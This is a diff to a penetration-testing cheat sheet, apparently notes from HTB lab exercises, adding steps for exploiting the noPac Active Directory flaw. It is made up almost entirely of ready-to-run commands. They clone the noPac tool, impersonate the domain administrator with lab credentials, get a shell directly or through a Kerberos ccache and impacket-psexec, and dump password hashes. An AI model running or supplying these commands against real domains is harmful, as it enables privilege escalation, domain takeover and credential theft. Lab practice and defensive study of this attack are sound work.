@@ -355,9 +355,16 @@ run the executable file
 Detect:
 nxc smb ip -u username -p pass -M nopac
 
+Get Shell:
 git clone https://github.com/Ridter/noPac.git
 sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
 sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+
+or
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap (it will generate ccache file)
+export KRB5CCNAME=/path/to/administrator@MANTIS.HTB.LOCAL.ccache
+append ip mantis.htb.local to /etc/host
+impacket-psexec -k -no-pass htb.local/administrator@mantis.htb.local(dc-hostname) -dc-ip dc-ip
 
 dump hash:
 sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -dump
